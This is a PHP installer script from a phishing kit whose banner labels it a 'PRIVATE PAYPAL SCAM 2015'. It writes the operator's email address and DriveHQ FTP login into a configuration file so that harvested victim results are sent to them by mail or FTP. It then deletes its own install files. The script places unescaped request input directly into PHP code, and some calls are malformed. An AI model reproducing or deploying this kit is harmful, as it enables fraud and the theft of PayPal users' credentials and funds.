<?php


/*

+----------------------------------+

�--- PRIVATE PAYPAL SCAM 2015 -----�

�--------- BY Dz[NO_o]B -----------�

�----------- GREETZ TO ------------�

�--- Dz Phoniex : Dz Injector -----�

�----------------------------------�
�https://code.google.com/p/dznoob/ �
�----------------------------------�
�https://facebook.com/DzNOoBpage   �
+----------------------------------+


*/


$instal = '$instal';
$mail = '$mail';
$ftp = '$ftp';
$a = '$a';
$b = '$b';
$c = '$c';
$em = $_REQUEST['element_11'];
$us = $_REQUEST['element_12'];
$pa = $_REQUEST['element_13'];
$ma = $_REQUEST['element_9'];
$ft = $_REQUEST['element_10'];



$option= "\n



//___Results Details _________________________________________
$mail=$ma;
//1 : Send Results in mail
//0 : Don't Send Results in mail
$ftp=$ft;
//1 : Send Results in FTP
//0 : Don't Send Results in FTP
$a='$em';  //ENTER YOUR EMAIL , PLEASE MAKE SURE IT VALID
$b='$us'; //ENTER YOUR DRIVEHQ USERNAME
$c='$pa'; //ENTER YOUR DRIVEHQ PASSWORD

$instal=1; // DON'T CHANGE

?>

\n";


copy("" . '' . "doption.php","" . '' . "../option.php");

$file = "../option.php"; 
$fp = fopen($file, "a");
fwrite($fp, $option);
unlink(index.html);
unlink(install.php);
header('Location: ../');
?>

<meta http-equiv="refresh" content="1; url=../">
